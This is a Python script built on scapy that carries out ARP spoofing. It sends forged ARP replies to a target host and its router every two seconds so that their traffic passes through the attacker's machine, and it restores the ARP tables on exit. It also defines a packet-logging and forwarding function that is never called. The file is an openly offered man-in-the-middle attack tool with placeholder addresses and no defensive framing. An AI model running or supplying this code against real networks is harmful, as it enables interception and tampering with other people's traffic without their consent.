import scapy.all as scapy
import time
import sys
import os


target_ip = "xyz"  
router_ip = "xyz"  


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") 
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc
    
target_mac = get_mac(target_ip)
router_mac = get_mac(router_ip)

print(f"[+] Target IP: {target_ip} (MAC: {target_mac})")
print(f"[+] Router IP: {router_ip} (MAC: {router_mac})")

def spoof(target, router, spoof_mac):

    
    packet_to_target = scapy.ARP(op=2, pdst=target, hwdst=target_mac, psrc=router, hwsrc=spoof_mac)
    
    packet_to_router = scapy.ARP(op=2, pdst=router, hwdst=router_mac, psrc=target, hwsrc=spoof_mac)
    
    scapy.send(packet_to_target, verbose=False)
    scapy.send(packet_to_router, verbose=False)


def restore(target_ip, router_ip, target_mac, router_mac):
    print("\n[!] Restoring ARP tables...")    
    target_restore_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip, hwsrc=router_mac)
    scapy.send(target_restore_packet, count=5, verbose=False)     
    router_restore_packet = scapy.ARP(op=2, pdst=router_ip, hwdst=router_mac, psrc=target_ip, hwsrc=target_mac)
    scapy.send(router_restore_packet, count=5, verbose=False)  
    os.system("echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward")
sent_packets_count = 0

def process_packet(packet):
    if packet.haslayer(scapy.IP):        
        print(f"[LOG] Intercepted -> Source: {packet[scapy.IP].src} | Dest: {packet[scapy.IP].dst}")  
        if packet[scapy.IP].src == target_ip and packet[scapy.IP].dst == router_ip:
            packet[scapy.Ether].dst = router_mac
            scapy.send(packet, verbose=False)
        elif packet[scapy.IP].src == router_ip and packet[scapy.IP].dst == target_ip:
            packet[scapy.Ether].dst = target_mac
            scapy.send(packet, verbose=False) 
try:
    print("[+] Starting ARP Spoofing loop. Press Ctrl+C to stop.")
    while True:
        spoof(target_ip, router_ip, get_mac(scapy.get_if_addr(scapy.conf.iface))) 
        sent_packets_count += 2
        print(f"\r[+] Packets Sent: {sent_packets_count}", end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[!] Detected Ctrl+C. Starting cleanup...")
finally:
    restore(target_ip, router_ip, target_mac, router_mac)
    print("[+] Cleanup complete. Network restored.")
    sys.exit(0)

